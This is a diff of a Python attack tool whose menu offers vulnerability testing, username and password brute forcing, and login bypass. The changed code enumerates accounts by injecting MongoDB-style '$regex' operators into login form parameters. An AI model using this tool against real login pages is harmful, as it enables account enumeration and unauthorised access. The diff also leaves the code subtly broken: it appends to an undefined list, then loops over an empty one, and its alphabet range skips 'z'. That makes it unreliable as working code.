@@ -10,7 +10,7 @@ except ImportError:
 
 username = "admin"
 user_param = "username"
-password_param ="password"
+password_param = "password"
 success_string = "Welcome back"
 
 def print_options():
@@ -22,7 +22,7 @@ f"""\033[94m[1]\033[0m Set target username (Current: '{username}')
 \033[94m[4]\033[0m Set unique success-identifier (Current: '{success_string}')
 -------------------------------
 \033[92m[5]\033[0m Test for vulnerability  .'|'.
-\033[92m[6]\033[0m Brute force username   /.'|\\ \\
+\033[92m[6]\033[0m Brute force usernames  /.'|\\ \\
 \033[92m[7]\033[0m Brute force password   | /|'.|
 \033[92m[8]\033[0m Bypass login            \ |\/
 ---------------------        \|/
@@ -72,13 +72,10 @@ def choice_test_vulnerability():
     await_input()
 
 def choice_username():
-    global username
     clear_terminal()
-    log("Getting username...")
+    log("Getting usernames...")
     log(f"Target: '{url}'", 3)
-    username = get_username_wrapper()
-    if not username:
-        username = 'admin'
+    get_usernames()
     await_input()
 
 def choice_password():
@@ -234,10 +231,10 @@ def get_username(username):
                     not_vulnerable()
                     return
 
-## gets number of usernames along with first character
-def get_username_wrapper():
+def get_usernames():
     usernames = []
     alphabet = list(map(chr, range(97, 122)))
+    
     for c in alphabet:
         params = {
             user_param + "[$regex]":"^"+c+".*",
@@ -246,14 +243,16 @@ def get_username_wrapper():
         response = send_sessionless_post(params)
         if not response:
             not_vulnerable()
-            return
-        if is_successfull(success_string,response):
-            usernames.append(c)
+            return 
+        if is_successfull(success_string, response):
+            username_start_characters.append(c)
             log(f"Found a username starting with {c}")
-        if c == alphabet[-1] and len(usernames)==0:
+        if c == alphabet[-1] and not len(username_start_characters):
             not_vulnerable()
-            return
-    log(f"Discovered {len(usernames)} valid usernames")
+            return 
+        
+    log(f"Discovered {len(usernames)} possible usernames... Getting full names")
+    
     for username in usernames:
         get_username(username)
 
